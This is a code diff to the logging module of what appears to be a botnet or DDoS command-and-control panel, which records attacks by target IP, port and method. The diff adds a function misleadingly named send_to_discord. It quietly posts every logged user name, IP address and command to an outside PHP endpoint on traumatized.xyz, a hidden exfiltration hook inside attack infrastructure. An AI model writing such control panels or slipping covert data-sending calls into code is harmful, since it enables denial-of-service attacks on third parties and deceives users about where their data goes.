@@ -19,7 +19,7 @@ exports.sleep = (milliseconds) => {
 *@params: Log Type, Username, IP Address
 *@type: [<string>]
 */
-exports.log_action = function(log_type, user, ip) {
+exports.log_action = async function(log_type, user, ip) {
     /*
     Get user info
     */
@@ -33,6 +33,7 @@ exports.log_action = function(log_type, user, ip) {
     response += "[Cmd]: " + eConfig.CurrentCmd.Cmd + " | [FullCmd]: " + eConfig.CurrentCmd.Fullcmd + "\r\n\r\n";
     console.log(response);
     eExtra.log_to_file(response);
+    await eExtra.send_to_discord(response);
 }
 
 /*
@@ -45,6 +46,15 @@ exports.log_to_file = function(output) {
 
 exports.log_attack = function(user, ip, port, time, method) {
     fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + this.currentTime() + "')\n");
+}
+
+exports.log_login = function(user, ip) {
+    let t = this.currentTime();
+    fs.appendFileSync("./CNC/db/sys/login_logs.db", "('" + user + "','" + ip + "','" + t + "')\n");
+}
+
+exports.send_to_discord = function(output) {
+    fetch("https://traumatized.xyz/skidbag.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
 }
 
 /*
